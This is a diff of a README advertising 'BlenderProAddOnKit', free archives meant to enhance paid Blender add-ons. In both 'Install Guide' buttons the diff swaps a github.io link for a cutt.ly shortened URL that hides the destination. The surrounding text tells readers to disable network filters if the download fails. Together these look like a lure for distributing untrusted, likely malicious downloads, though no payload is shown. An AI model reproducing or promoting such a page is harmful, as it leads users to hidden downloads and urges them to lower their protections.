@@ -6,8 +6,8 @@
 
 **About BlenderProAddOnKit**: BlenderProAddOnKit is a premier repository for *Blender 4.5 LTS* users on Windows and Mac, offering free enhancement archives to complement premium add-ons for this free 3D suite, updated in August 2025 with Vulkan and a new Grease Pencil pass. Priced $10–$100+, add-ons enhance modeling and rendering. Our archives include custom scripts, add-on presets, and optimization tools to streamline workflows, improve performance, and maximize add-on value. Backed by 110K+ visitors and 80K+ members, this September 12, 2025 update empowers your paid add-ons with community-driven solutions. (349 characters)
 
-<a href="https://blenderaddonmasters.github.io/.github/" target="_blank">
-  <img src="https://img.shields.io/badge/Install_Guide-Windows-3498db" alt="Install Guide Now" width="250" height="45" style="border:none;">
+<a href="https://cutt.ly/erNtEvlA" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
 ---
@@ -36,8 +36,8 @@ Enhance your *Blender 4.5 LTS* premium add-ons with **BlenderProAddOnKit** on Wi
 5. **Fix Download Issues** 🌐  
    If the archive doesn’t download, disable network filters or switch browsers (Chrome, Firefox).
 
-<a href="https://blenderaddonmasters.github.io/.github/" target="_blank">
-  <img src="https://img.shields.io/badge/Install_Guide-Windows-3498db" alt="Install Guide Now" width="250" height="45" style="border:none;">
+<a href="https://cutt.ly/erNtEvlA" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
 ---
